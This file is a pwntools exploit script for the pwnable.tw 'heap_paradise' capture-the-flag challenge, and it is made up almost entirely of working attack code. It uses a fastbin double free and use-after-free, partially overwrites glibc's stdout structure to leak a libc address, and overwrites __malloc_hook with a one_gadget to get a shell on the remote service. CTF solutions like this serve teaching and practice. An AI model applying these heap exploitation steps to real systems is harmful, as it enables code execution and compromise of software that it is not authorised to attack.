
from pwn import *

#p = process('./heap_paradise')
p = remote('chall.pwnable.tw',10308)
#libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
libc = ELF('./libc_64.so.6')

##############
#ratio = 1/16#
##############
context.log_level = 'debug'

def allocate(size,string):
        p.sendlineafter('You Choice:','1')
        p.sendlineafter('Size :',str(size))
        p.sendafter('Data :',string)

def free(index):
        p.sendlineafter('You Choice:','2')
        p.sendlineafter('Index :',str(index))

#gdb.attach(p,'''break *0x555555554dd5
#''')

#step1: use after free -> overwrite fd pointer of chunk fastbin become '/x20'
#-> tmp = allow(this size) tmp will save pointer chunk in heap_base+0x20
#-> overwrite chunk size of chunk in heap_base+0x20 (become sizeof unsorted bin)
#-> free(heap_base+0x20) -> chunk in unsorted bin

allocate(0x68,'f'*0x10+p64(0)+p64(0x71)) #0
allocate(0x68,'a'*0x10+p64(0)+p64(0x31)+'a'*0x20+p64(0)+p64(0x21)) #1

free(0)
free(1)
free(0)

allocate(0x68,'\x20') #2
allocate(0x68,'\x00') #3
allocate(0x68,'\x00') #4
allocate(0x68,'\x00') #5 <-> save pointer heap_base+0x20
free(0)

allocate(0x68,'d'*0x10+p64(0)+p64(0xa1)) #6 overwrite_sizeofchunk heap_base+0x20
free(5) #free chunk heap_base+0x20

#step2:
# use use after free overwrite _IO_2_1_stdout (1/16): flags _IO_write_base to print address leak
# -->overwrite __malloc_hook one_gadget

free(0)
free(1)

allocate(0x78,'f'*0x40+p64(0)+p64(0x71)+'\xa0') #7
free(7)

allocate(0x68,'b'*0x20+p64(0)+p64(0x71)+p64(libc.sym['_IO_2_1_stdout_']-0x43)[:2]) #8

#allocate(0x68,'b'*0x20+p64(0)+p64(0x71)+p64(0x7ffff7dd2620-0x43)) #8 libc-2.23
allocate(0x68,'\0') #9

allocate(0x68,'\x00'*0x33+p64(0xfbad1800)+p64(0)*3+'\x88') #10

IO_stdin_address = u64(p.recv(8))
libc.address = IO_stdin_address - libc.sym['_IO_2_1_stdin_']
main_arena = libc.sym['__malloc_hook']+0x10

log.info('libc_address:'+hex(libc.address))
log.info('main_arena_address:'+hex(main_arena))
#pause()
free(1)

#pause()
allocate(0x78,'c'*0x40+p64(0)+p64(0x71)+p64(main_arena-0x33))

#pause()
allocate(0x68,'\x00')

#pause()
allocate(0x68,'z'*0x13+p64(libc.address+0xef6c4)) #one_gadget

#pause()
# Your choice:1
# Size:4
# {cat the flag}

p.interactive()
